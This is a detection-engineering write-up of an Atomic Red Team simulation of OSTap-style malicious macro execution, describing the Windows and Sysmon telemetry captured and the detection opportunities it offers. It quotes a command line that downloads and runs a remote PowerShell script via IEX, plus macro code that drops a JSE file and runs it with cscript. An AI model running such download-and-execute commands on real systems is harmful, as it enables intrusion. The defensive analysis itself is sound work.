# T1204.002-1: Malicious File — OSTap Style Macro Execution

## Technique Context

T1204.002 (Malicious File) represents one of the most common initial access and execution vectors in enterprise environments. Attackers leverage social engineering to trick users into opening weaponized documents containing malicious macros, scripts, or other executable content. The "OSTap Style" refers to a specific macro implementation pattern that creates and executes secondary payloads, commonly seen in banking trojans and other malware families.

The detection engineering community focuses heavily on this technique because it sits at the intersection of user behavior and technical controls. Key detection opportunities include macro execution indicators, suspicious file operations, process relationships showing document applications spawning unusual child processes, and network connections from Office applications. The technique is particularly valuable for testing detection coverage of user-initiated execution chains and macro-based payload delivery.

## What This Dataset Contains

This dataset captures a PowerShell-based simulation of OSTap-style macro execution that attempts to create a Microsoft Word document with embedded VBA macros. The execution chain shows:

**Process Creation Chain:** Security event 4688 shows PowerShell spawning with the command line `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"C:\Users\Public\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit\"`n   Close #1`n   Shell`$ `\"cscript.exe C:\Users\Public\art.jse\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"}`.

**Network Activity:** Sysmon EID 22 shows DNS resolution for `raw.githubusercontent.com`, and PowerShell event 4103 captures the `Invoke-WebRequest` cmdlet downloading the Invoke-MalDoc script.

**PowerShell Execution:** Event 4104 contains the complete Invoke-MalDoc function source code, showing the macro creation logic that would write a JSE file to `C:\Users\Public\art.jse` and execute it via cscript.exe.

**Failure Evidence:** PowerShell error event 4100 shows `"Retrieving the COM class factory for component with CLSID {00000000-0000-0000-0000-000000000000} failed due to the following error: 80040154 Class not registered (Exception from HRESULT: 0x80040154 (REGDB_E_CLASSNOTREG))"`, indicating Microsoft Office is not installed on the test system.

**Registry Interaction:** PowerShell events 4103 capture attempts to manipulate the Office VBA security registry key at `HKCU:\Software\Microsoft\Office\\Word\Security\`, with errors showing the path doesn't exist.

## What This Dataset Does Not Contain

The dataset lacks the actual malicious document creation and macro execution because Microsoft Office/Word is not installed on the test system (HRESULT 0x80040154). This means you won't find:

- Sysmon EID 1 events for winword.exe or other Office processes
- File creation events (EID 11) for malicious documents or the intended `C:\Users\Public\art.jse` payload
- Process creation for cscript.exe executing the dropped JSE file
- Registry modifications to enable VBA macro access
- Successful COM object instantiation for Word.Application

The Sysmon configuration's include-mode filtering means no ProcessCreate events were captured for the parent PowerShell process that initiated this test, though Security 4688 events provide this coverage.

## Assessment

This dataset provides moderate value for detection engineering, primarily as a negative test case. The PowerShell telemetry is comprehensive and clearly shows the attack attempt, including the complete attack script and intended payload. The network resolution and web request provide good indicators of the initial download phase.

However, the lack of Office installation significantly limits the dataset's utility for testing detections of actual macro execution, document manipulation, or the final payload deployment. The PowerShell error handling and registry interaction attempts still provide valuable behavioral indicators that could catch similar attacks even when they partially fail.

The data quality is good for understanding attacker techniques and building detections around PowerShell-based macro simulation tools, but insufficient for comprehensive Office macro execution detection testing.

## Detection Opportunities Present in This Data

1. **PowerShell downloading external scripts** - Event 4103 showing `Invoke-WebRequest` to `raw.githubusercontent.com` with `.ps1` file extensions
2. **Suspicious PowerShell script block content** - Event 4104 containing VBA macro generation functions and Office automation references
3. **Office COM object instantiation attempts** - PowerShell error 4100 indicating attempted `Word.Application` COM object creation
4. **Registry manipulation attempts for Office security** - Event 4103 showing `Set-ItemProperty` targeting Office VBA security settings
5. **Process command line containing macro simulation indicators** - Security 4688 with command lines referencing "Invoke-MalDoc" and macro code variables
6. **DNS resolution for code hosting platforms** - Sysmon EID 22 showing resolution of `raw.githubusercontent.com`
7. **PowerShell execution policy bypass** - Event 4103 showing `Set-ExecutionPolicy Bypass` in the execution chain
8. **Nested PowerShell execution patterns** - Multiple Sysmon EID 1 events showing PowerShell spawning additional PowerShell processes
9. **File path indicators in command lines** - References to `C:\Users\Public\art.jse` and `cscript.exe` execution in macro code
